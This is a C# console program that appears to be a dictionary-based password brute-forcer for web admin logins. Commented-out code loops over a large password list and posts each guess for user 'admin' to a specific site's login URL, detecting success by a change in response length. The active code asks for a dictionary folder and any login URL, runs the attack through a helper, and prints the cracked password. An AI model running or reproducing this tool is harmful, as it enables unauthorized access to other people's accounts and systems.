using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace PostNodify
{
    class Program
    {
        static void Main(string[] args)
        {
            //HttpWebRequestPost("http://localhost:6832/WxPay/Notify", "<xml><sign></sign></xml>");
            //Post("https://pm.shundaonetwork.com/public/home/Notify", "<xml><sign></sign></xml>");
            //Post("http://localhost:21021/api/services/app/MobliePay/Nodify", "<xml><sign>abccc</sign></xml>");
            //Post("http://localhost:21021/Nodify/MobliePay", "<xml><sign>abccc</sign></xml>");
            //Post("http://localhost:21021/Nodify/Test2", "<xml><sign>abccc</sign></xml>");
            //string[] line = File.ReadAllLines(@"C:\Users\hewei\Desktop\400W.txt");
            //foreach (var item in line)
            //{
            //    string result = PostFrom("http://ceshi.tombsale.com/admin/user/login", $"username=admin&password={item}&__hash__=d7b4af35b71c22996adb904671f0ecd3_054874de5e03895f0b95ac76534b755b");
            //    Console.WriteLine(item);
            //    if (result.Length != 1560)
            //    {
            //        break;
            //    }
            //}
            SaveFile.ToTxt("我是密码", Directory.GetCurrentDirectory() + @"\测试.txt");
            SaveFile.ToTxt("我是密码2", Directory.GetCurrentDirectory() + @"\测试.txt");
            Console.WriteLine("hi 猛男");
            Console.WriteLine("请输入文件夹路径:");
            string path = Console.ReadLine();
            //string[] line = File.ReadAllLines(path);
            //Console.WriteLine("密码字典加载成功");
            //int taskcount;
            //while (true)
            //{
            //    Console.WriteLine("请输入线程数!");
            //    string num = Console.ReadLine();
            //    if (int.TryParse(num, out taskcount))
            //    {
            //        break;
            //    }
            //}

            //var st = PostHelper.TaskArrayPost(line, "http://ceshi.tombsale.com/admin/user/login", taskcount);
            Console.WriteLine("请输入要登陆的url:");
            string url = Console.ReadLine();
            //"http://ceshi.tombsale.com/admin/user/login"
            string pw = PostHelper.LoadFilesPost(path, url);
            Console.WriteLine("结束，这里有密码。");
            Console.WriteLine("密码=================>" + pw);
            Console.WriteLine("post over");
            Console.ReadKey();

        }

    }

}
